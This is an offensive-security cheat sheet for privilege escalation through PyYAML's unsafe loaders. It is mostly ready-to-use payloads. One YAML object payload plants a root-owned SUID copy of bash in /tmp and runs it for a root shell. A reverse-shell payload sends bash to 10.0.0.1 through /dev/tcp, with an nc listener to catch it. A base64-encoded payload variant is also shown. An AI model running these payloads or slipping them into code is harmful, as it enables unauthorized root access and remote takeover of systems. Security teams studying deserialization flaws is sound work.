---
title: Python Yaml Privilege Escalation
description: Python Yaml package is vulnerable to execute arbitrary command.
tags:
    - Privilege Escalation
refs:
    - https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation
date: 2023-03-26
draft: false
---

## Investigation

```python
import yaml

filename = "example.yml"
yaml.load()
```

<br />

## Payloads

```python
import yaml
from yaml import Loader, UnsafeLoader

data = b'!!python/object/new:os.system ["cp `which bash` /tmp/bash;chown root /tmp/bash;chmod u+sx /tmp/bash"]'
yaml.load(data)
yaml.load(data, Loader=Loader)
yaml.load(data, Loader=UnsafeLoader)
yaml.load_all(data)
yaml.load_all(data, Loader=Loader)
yaml.load_all(data, Loader=UnsafeLoader)
yaml.unsafe_load(data)
```

Now execute the **`bash`** in privilege mode.

```bash
/tmp/bash -p
```

### Reverse Shell

Start a listener in local machine.

```bash
nc -lvnp 1234
```

Then execute Python script that contains the following `YAML` code as root.

```python
import yaml
yaml.load('!!python/object/new:os.system ['bash -c "bash -i >& /dev/tcp/10.0.0.1/1234 0>&1"'])
```

### Base64 Encoding

Sometimes we might be able to remote code execution by using Base64 encoded payload.

```python
yaml.load(b64decode(b"ISFweXRa...YXNoIl0="))
```